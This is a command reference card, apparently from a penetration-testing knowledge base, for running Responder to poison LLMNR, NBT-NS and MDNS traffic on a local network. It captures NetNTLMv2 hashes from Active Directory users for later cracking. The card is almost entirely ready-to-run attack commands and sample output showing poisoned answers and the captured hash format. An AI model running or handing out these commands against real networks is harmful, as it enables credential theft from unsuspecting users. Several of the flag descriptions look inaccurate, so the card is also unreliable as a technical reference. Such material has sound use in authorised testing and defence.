---
type: command
executor: bash
data: responder -I $_INTERFACE -w -r -d
tags:
  - mitm
  - ntlm-relay
  - credential-access
platforms:
  - Linux
verified: true
validated: true
---

# responder-capture-ntlm-hashes

## Command

```bash
responder -I $_INTERFACE -w -r -d
```

## Description

This command starts Responder to perform LLMNR, NBT-NS, and MDNS poisoning on the specified network interface, capturing NTLM authentication hashes from victims who query non-existent names. Use in AD environments to relay and log NetNTLMv2 challenges for later cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_INTERFACE | Network interface (e.g., eth0, wlan0) | Yes |
| -w | Enable WPAD poisoning for browser credential capture | No |
| -r | Enable NBT-NS poisoning and relay | No |
| -d | Enable MDNS poisoning | No |

## Examples

### Basic Usage

```bash
responder -I eth0 -w -r -d
```

### Advanced Usage

```bash
responder -I eth0 -w -r -d -A  # Add analysis mode for fingerprinting
```

## Expected Output

Console output showing poisoning activity:

[LLMNR]  Poisoned answer sent to 192.168.1.100 for name example.local
[NBT-NS]  Poisoned answer sent to 192.168.1.100 for name example

Captured hashes saved to logs/ directory, e.g., HTTP-NTLMv2-Client1.txt containing:

VICTIM::DOMAIN:CHALLENGE:HASH:...

## Related

- [[procedures/Active-Directory-MitM-and-Password-Cracking]]
- [[tools/Responder]]
